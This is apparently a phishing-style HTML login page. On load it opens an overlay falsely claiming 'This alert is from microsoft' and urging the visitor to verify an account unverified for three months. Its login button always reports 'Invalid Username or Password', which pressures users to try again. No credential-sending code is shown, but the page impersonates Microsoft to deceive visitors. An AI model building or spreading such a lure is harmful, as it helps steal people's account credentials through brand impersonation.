<!DOCTYPE html>
<html lang="en">
<head>
	<title>Login</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
<script>
function err() {
	alert('Invalid Username or Password');
}

</script>
<Style>
#fade{
display: none;
position: fixed;
top: 0%;
left: 0%;
width: 100%;
height: 100%;
background-color: #000;
z-index:1001;
-moz-opacity: 0.7;
opacity:.70;
filter: alpha(opacity=70);
}
#light{
display: none;
position: absolute;
top: 5%;
left: 45%;
width: 310px;
height: 203px;
margin-left: -140px;
margin-top: 100px;                 
background: #ededed;
z-index:1002;
overflow:visible;
}
</style>

</head>
<body onload="lightbox_open()";>






	<div class="limiter">
		<div class="container-login100" style="background-image: url('images/44444.jpg');">
			<div class="wrap-login100 p-t-190 p-b-30">
				<form class="login100-form validate-form">
					<div class="login100-form-avatar">
						<img src="images/avatar-01.jpg" alt="AVATAR">
					</div>
					<span class="login100-form-title p-t-20 p-b-45">
						Log in
					</span>
					<div class="wrap-input100 validate-input m-b-10">
						<input class="input100" type="text" name="username" placeholder="Username">
					</div>
					<div class="wrap-input100 validate-input m-b-10">
						<input class="input100" type="password" name="pass" placeholder="Password">
					</div>
					<div class="container-login100-form-btn p-t-10">
						<button class="login100-form-btn" onclick="err()">
								Login
							</button>
					</div>
					
				</form>
			</div>
		</div>
	</div>
	<div class="light" onClick="lightbox_close();" id="light">
<section >
  <article>
    <center style="padding:0px;font-family:&quot;Segoe UI Light&quot;,&quot;Segoe UI&quot;,&quot;Helvetica Neue Medium&quot;,Arial,sans-serif;font-size:41px;color:rgb(45,105,245)">
<span style="color:rgb(52,130,255)">Alert !</center>
    <p style="padding:25px 0px 0px;font-family:&quot;Segoe UI&quot;,Tahoma,Verdana,Arial,sans-serif;font-size:14px;color:rgb(68,68,68)">This alert is from microsoft <br>You have not verified your account from last 3 months kindly verify</p><br>
	<table cellspacing="0" border="0">
<tbody>
<tr>
<td style="background-color:rgb(48,124,226);padding:5px 20px;min-width:50px" bgcolor="#2672ec">
<p rel="noopener noreferrer" style="font-family:&quot;Segoe UI Semibold&quot;,&quot;Segoe UI Bold&quot;,&quot;Segoe UI&quot;,&quot;Helvetica Neue Medium&quot;,Arial,sans-serif;font-size:14px;text-align:center;text-decoration:none;font-weight:600;letter-spacing:0.02em;color:rgb(245,250,252)">Verify</p></td>
</tr>
</tbody>
</table>
   
  </article>
</section>
	</div>

			
			<div id="fade" onClick="lightbox_close();"></div>
	
	<script>
window.document.onkeydown = function (e)
{
if (!e){
    e = event;
}
if (e.keyCode == 1){
    lightbox_close();
}
}
function lightbox_open(){
window.scrollTo(0,0);
document.getElementById('light').style.display='block';
document.getElementById('fade').style.display='block';  
}
function lightbox_close(){
document.getElementById('light').style.display='none';
document.getElementById('fade').style.display='none';
}
</script>
	
</body>
</html>
